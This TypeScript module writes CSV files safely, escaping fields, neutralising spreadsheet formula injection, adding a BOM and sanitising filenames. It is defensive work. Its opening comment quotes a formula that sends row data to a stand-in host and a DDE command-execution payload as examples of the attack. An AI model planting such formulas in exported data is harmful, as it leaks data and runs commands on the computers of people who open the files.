/**
 * Writing CSV that a spreadsheet opens correctly and safely.
 *
 * The payroll register already escapes quotes, commas and newlines inline. This
 * is the same rule extracted so more than one exporter can share it, plus the
 * one thing that escaping alone does not cover: formula injection.
 *
 * ### Why formula injection matters here
 *
 * A customer directory exports fields people typed — a company name, an
 * address, a note. If a value begins with `=`, `+`, `-`, `@`, a tab or a
 * carriage return, Excel and Google Sheets treat the cell as a formula rather
 * than text. `=HYPERLINK("http://x/?"&A1,"Click")` in a company name becomes a
 * live link that exfiltrates the row when a colleague opens the file, and
 * `=cmd|'/c calc'!A1` has historically been worse than that.
 *
 * Quoting does not help: a spreadsheet strips the quotes and still evaluates
 * what is inside. The fix has to change the cell's *content*, which is why this
 * module prefixes a single quote — the convention both Excel and Sheets read as
 * "this is text" — rather than relying on the quoting below.
 *
 * ### What this deliberately does not do
 *
 * **No field selection.** Which columns leave the building is an authorization
 * decision, not a formatting one, so the caller chooses and this module writes
 * what it is given. A helper that guessed would be a helper that leaked.
 */

/** Cells a spreadsheet would evaluate rather than display. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Makes one cell safe to open.
 *
 * Two separate problems, handled in order:
 *
 *  1. A leading formula character is neutralised with a `'` prefix, which both
 *     Excel and Sheets read as "treat the rest as text". The original
 *     characters are kept, so the value is still legible — `-5` reads as `-5`,
 *     not as a number that has been mangled.
 *  2. Quotes, commas, newlines and carriage returns are handled by RFC 4180
 *     quoting, doubling any interior quote.
 *
 * A negative number is the awkward case: `-5` starts with `-`, so it is
 * prefixed too. That is the correct trade — a cell reading `-5` as text is a
 * cosmetic cost, while an un-neutralised `-` is an evaluated cell. Callers that
 * genuinely need numeric cells should say so by formatting them without a
 * leading sign, which every money figure in this CRM already does.
 */
export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';

  let cell = String(value);
  if (cell === '') return '';

  if (FORMULA_PREFIXES.some((prefix) => cell.startsWith(prefix))) {
    cell = `'${cell}`;
  }

  // Also quote a cell with leading or trailing spaces: some readers trim them,
  // and a trimmed value is a changed value.
  if (/[",\n\r]/.test(cell) || cell !== cell.trim()) {
    return `"${cell.replace(/"/g, '""')}"`;
  }
  return cell;
}

/** One row, escaped and joined. */
export function csvRow(cells: readonly (string | number | null | undefined)[]): string {
  return cells.map(csvCell).join(',');
}

/**
 * A whole document: header then rows, CRLF separated.
 *
 * CRLF because RFC 4180 specifies it and because Excel on Windows is the most
 * common reader. A trailing newline is included so appending is well defined.
 *
 * ### The BOM
 *
 * A UTF-8 byte-order mark is prepended by default. Without it, Excel on Windows
 * reads a UTF-8 file as the system's legacy code page, so a Devanagari customer
 * name or a ₹ sign arrives as mojibake. The BOM is the only thing that makes
 * Excel read it correctly, and every other reader tolerates it.
 */
export function csvDocument(
  header: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
  options: { bom?: boolean } = {},
): string {
  const body = [csvRow(header), ...rows.map(csvRow)].join('\r\n');
  const withNewline = `${body}\r\n`;
  return options.bom === false ? withNewline : `﻿${withNewline}`;
}

/**
 * A filename that is safe in a Content-Disposition header.
 *
 * Strips quotes, semicolons, path separators and control characters: a filename
 * carrying a `"` ends the header's quoted string early, and one carrying `/`
 * or `..` is a path rather than a name.
 */
export function csvFilename(base: string, when: Date = new Date()): string {
  const safe = base
    .replace(/[^A-Za-z0-9._-]+/g, '-')
    /*
      Dots are collapsed to a single one AFTER the character filter, not
      before. Filtering alone leaves `..` intact — it is made of permitted
      characters — and `..` in a filename is a traversal segment rather than a
      name. The sequence is what matters, so it is removed as a sequence.
    */
    .replace(/\.{2,}/g, '.')
    .replace(/^[.-]+|[.-]+$/g, '')
    .slice(0, 80);
  const stamp = when.toISOString().slice(0, 10);
  return `${safe || 'export'}-${stamp}.csv`;
}
